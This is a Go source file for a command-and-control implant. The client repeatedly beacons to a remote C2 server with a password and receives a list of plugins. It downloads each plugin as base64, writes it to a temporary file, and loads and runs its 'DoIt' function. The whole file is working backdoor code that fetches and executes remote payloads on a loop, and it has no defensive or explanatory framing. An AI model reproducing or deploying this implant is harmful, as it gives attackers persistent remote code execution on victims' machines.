package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"plugin"
	"strconv"
	"time"
)

var PrintDebugMessages bool

type ImplantPlugin struct {
	PluginId     string //GUID
	PluginName   string
	PluginFile   string
	PluginUrl    string
	PluginResult string
}

type ImplantClient struct {
	Url          string
	C2Pass       string
	PluginsToRun []ImplantPlugin
}

type PluginsFromC2 []struct {
	PluginID   string `json:"pluginId"`
	PluginURL  string `json:"pluginUrl"`
	PluginName string `json:"pluginName"`
}

func DebugPrinter(msg string) {
	if PrintDebugMessages {
		fmt.Println(msg)
	}
}

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func (implantClient *ImplantClient) DownloadPlugins() error {
	for idx, pluginToDownload := range implantClient.PluginsToRun {
		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
		res, err := http.PostForm(pluginToDownload.PluginUrl, url.Values{
			"pluginId": {pluginToDownload.PluginId},
		})
		defer res.Body.Close()
		pluginBase64, err := ioutil.ReadAll(res.Body)
		CheckError(err)
		// DebugPrinter("GOT: " + string(pluginBase64))
		path, err := implantClient.WritePluginToTempDir(string(pluginBase64))
		if err != nil {
			return nil
		}
		implantClient.PluginsToRun[idx].PluginFile = path
	}
	return nil
}

func (implantClient *ImplantClient) WritePluginToTempDir(base64Plugin string) (string, error) {
	data, err := base64.StdEncoding.DecodeString(base64Plugin)
	CheckError(err)
	f, err := os.CreateTemp("", "tmpfile-")
	CheckError(err)
	defer f.Close()
	_, err = f.Write(data)
	CheckError(err)
	return f.Name(), nil
}

func (implantClient *ImplantClient) ExecutePlugins() error {
	for idx, pluginToRun := range implantClient.PluginsToRun {
		DebugPrinter("EXECUTING " + pluginToRun.PluginFile)
		plugin, err := plugin.Open(pluginToRun.PluginFile)
		if err != nil {
			DebugPrinter("Plugin is already loaded or some other error.")
			DebugPrinter(err.Error())
			continue
		}
		DebugPrinter("PLUGIN LOADED... READY TO EXECUTE")
		doItSymbol, err := plugin.Lookup("DoIt")
		if err != nil {
			return err
		}

		doItFunc, ok := doItSymbol.(func() (string, error))
		if !ok {
			DebugPrinter("Could not do the thing")
		}

		result, err := doItFunc()
		if err != nil {
			return err
		}

		DebugPrinter("RESULT: " + result)
		implantClient.PluginsToRun[idx].PluginResult = result
	}
	return nil
}

func (implantClient *ImplantClient) HeartBeat() error {
	//Call C2 server get json list of plugins
	res, err := http.PostForm(implantClient.Url, url.Values{
		"client_password": {implantClient.C2Pass}})
	CheckError(err)
	//Update Plugin list
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	CheckError(err)
	var data PluginsFromC2
	json.Unmarshal(body, &data)
	DebugPrinter("GOT " + string(body))
	for _, pluginFromC2 := range data {
		pluginToAdd := ImplantPlugin{
			PluginId:   pluginFromC2.PluginID,
			PluginName: pluginFromC2.PluginName,
			PluginUrl:  pluginFromC2.PluginURL,
		}
		DebugPrinter("PLUGIN " + pluginToAdd.PluginUrl)
		DebugPrinter("LEN BEFORE: " + strconv.Itoa(len(implantClient.PluginsToRun)))
		implantClient.PluginsToRun = append(implantClient.PluginsToRun, pluginToAdd)
	}
	DebugPrinter("LEN BEFORE: " + strconv.Itoa(len(implantClient.PluginsToRun)))
	DebugPrinter(implantClient.PluginsToRun[0].PluginUrl)
	//Decode body and add to plugin list
	return nil
}

func (implantClient *ImplantClient) Loop() error {
	DebugPrinter("Sending heartbeat")
	err := implantClient.HeartBeat()
	if err != nil {
		return err
	}
	//Download plugins
	DebugPrinter("Downloading plugins")
	err = implantClient.DownloadPlugins()
	if err != nil {
		return err
	}
	//Execute plugins
	DebugPrinter("Executing plugins")
	err = implantClient.ExecutePlugins()
	if err != nil {
		return err
	}
	return nil
}

func (implantClient *ImplantClient) ClearPluginList() error {
	implantClient.PluginsToRun = nil
	return nil
}

func main() {
	PrintDebugMessages = true

	if len(os.Args) != 3 {
		log.Fatal("Missing arguments. Please correct.")
	}

	host := os.Args[1]
	c2_pass := os.Args[2]

	fmt.Println("Connecting to " + host)

	implant := ImplantClient{
		Url:          host,
		C2Pass:       c2_pass,
		PluginsToRun: make([]ImplantPlugin, 0),
	}

	for {
		err := implant.Loop()
		CheckError(err)
		time.Sleep(10 * time.Second)
	}
}
